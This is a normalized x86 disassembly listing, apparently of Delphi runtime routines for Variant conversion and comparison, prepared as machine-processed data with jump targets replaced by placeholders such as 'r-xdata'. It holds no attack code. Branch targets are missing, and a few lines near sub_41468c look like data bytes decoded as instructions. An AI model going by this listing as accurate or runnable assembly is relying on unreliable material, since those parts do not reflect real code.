je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f1a4
sub_4135e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fd0
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_413610
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404858
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_413648
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4058b8
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_413674
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4058b8
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1a4
sub_4136a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4136e3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4047a8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136ea
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
sub_4136f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413746
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f548
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f548
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41374d
lea eax [ ebp - 0x10 ]
call sub_40f220
retn
sub_41375c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ ebx ] 0x400c
jne r-xdata
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41375c
jmp r-xdata
mov di [ ebx ]
movzx eax di
cmp eax 0x14
jg r-xdata
mov eax esi
call sub_40f1a4
pop edx
pop edi
pop esi
pop ebx
retn
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4136a0
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax esi
call sub_4136f0
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f814
jmp r-xdata
je r-xdata
test di 0x2000
je r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40f814
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
test [ ebx + 0xb ] 0x80
je r-xdata
jmp r-xdata
mov eax edi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov ecx sub_413754
mov edx ebx
mov eax esi
call sub_40f2c8
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f814
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40f814
jmp r-xdata
mov edx esp
mov eax edi
call sub_414940
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f548
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40f814
jmp r-xdata
jmp r-xdata
call sub_40e994
mov ecx ebx
mov edx esi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub_4138ac
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40ea84
mov bx 0x8
jmp r-xdata
sub_4138d0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413993
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f548
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_414184
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41399a
lea eax [ ebp - 0x11 ]
call sub_40f220
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413967
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f548
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_414184
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f220
retn
sub_4139b8
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40ead8
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40ead8
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40ead8
jmp r-xdata
je r-xdata
call sub_40ea84
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_413ab4
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_413af0
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413b18
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413b40
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413b6c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_413bc7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412538
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412538
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f18
xor edx edx
call sub_413aa0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413bce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
sub_413bd8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_4138ac
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_4138ac
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40ea84
mov al 0x1
jmp [ edx * 4 + jump_table_413c29 ]
call sub_40ea84
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4139a4
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_4139b8
jmp r-xdata
mov eax edi
call sub_40fbd8
push eax
mov eax esi
call sub_40fbd8
pop edx
call sub_413aa0
jmp r-xdata
mov eax esi
call sub_41069c
push edx
push eax
mov eax edi
call sub_41069c
push edx
push eax
call sub_413ab4
jmp r-xdata
mov eax esi
call sub_4111ac
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_4111ac
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413af0
jmp r-xdata
mov eax esi
call sub_41191c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_41191c
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413b18
jmp r-xdata
mov eax esi
call sub_411e84
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411e84
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_413b40
jmp r-xdata
mov edx edi
mov eax esi
call sub_413b6c
jmp r-xdata
mov eax edi
call sub_410c98
and eax 0x7f
push eax
mov eax esi
call sub_410c98
and eax 0x7f
pop edx
call sub_413aa0
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_4138d0
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413d64
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_4139a4
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_4139a4
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_414940
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_4139b8
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_414940
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_4139b8
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40ea84
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40ea84
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413efd
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f814
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_414940
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41408f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f814
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413fed
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f814
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413bd8
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f220
retn
call sub_40e994
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413e6f
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f814
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40ea84
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413bd8
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f220
retn
call sub_40e994
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f220
retn
call sub_40e994
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f220
retn
call sub_40e994
call sub_40ea84
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414145
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f814
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f220
retn
call sub_40e994
sub_414184
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_414184
jmp r-xdata
call sub_413bd8
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_414184
jmp r-xdata
pop edi
pop esi
retn
call sub_413d64
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413bd8
jmp r-xdata
sub_414370
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414496
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403fd0
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403fd0
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_414940
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fd0
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404288
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_4082d0
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404288
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40313c
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402904
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4041e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41449d
lea eax [ ebp - 0x208 ]
call sub_403f7c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404288
sub_4144f4
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4144e4
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_414940
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_414568
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4144e4
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_4144e4
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414ae8
sete al
xor eax eax
jmp r-xdata
sub_414604
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_414604
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_414650
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_414604
pop ecx
pop edx
retn
sub_41468c
inc [ eax - 0x1c ]
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_414940
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4148c0
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_41469c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4146fd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404ff8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414704
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4031ec
sub_41474c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4148c0
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_414940
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4147a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4147d8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4148c0
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414814
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035b8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414877
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41487e
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_414918
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414940
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4149e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404ff8
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4149f8
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414ace
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414ab1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405000
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ab8
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
